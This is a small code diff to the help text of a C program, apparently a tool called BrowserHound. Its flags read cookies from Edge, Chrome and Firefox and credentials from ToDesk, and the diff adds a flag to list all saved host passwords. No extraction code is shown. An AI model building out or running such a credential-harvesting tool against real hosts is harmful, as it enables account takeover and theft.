@@ -15,13 +15,9 @@ void PrintMessageW(wchar_t const* const Message, ...) {
     wprintf(Message);
 }
 void usage() {
-    printf("Help!\n\n");
-    printf("Examples:\n");
-    printf(".\\BrowserHound.exe\n");
-    printf("    By default targets first available Chrome process\n");
-    printf("\n");
-    printf("Flags:\n");
+    printf("\nFlags:\n");
     printf("    /edge       Get the cookies for the current host\n");
+    printf("        /pass       Lists all host passwords\n");
     printf("    /chrome       Get the cookies for the current host\n");
     printf("    /firefox       Get the cookies for the current host\n");
     printf("    /todesk       Get the credentials for the current host\n");
